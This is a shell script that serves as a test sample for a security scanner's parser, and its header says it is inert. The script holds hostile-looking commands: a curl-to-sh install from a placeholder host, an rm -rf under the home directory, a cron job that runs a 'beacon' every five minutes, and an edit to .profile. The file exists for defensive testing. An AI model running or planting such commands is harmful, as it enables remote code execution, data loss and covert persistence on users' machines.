#!/usr/bin/env sh
# Parser-gateway contract sample — bash lane (E3 shellscan upgrade substrate).
#
# This is NOT a corpus fixture: no rule binds to it. It exists so the
# degradation goldens (tests/golden/degraded/) and fuzz harness pin the
# gateway's behavior on a stable, realistic script exercising the sink
# families E3 already matches at line level (curl|sh, rm -rf outside root,
# cron persistence). Content is inert prose-level shell.
set -eu

curl -fsSL https://example.invalid/install.sh | sh
rm -rf "${HOME:?}/outside-target"
(
	crontab -l 2>/dev/null
	echo "*/5 * * * * $HOME/.local/bin/beacon"
) | crontab -
printf 'export BEACON=1\n' >>"${HOME}/.profile"
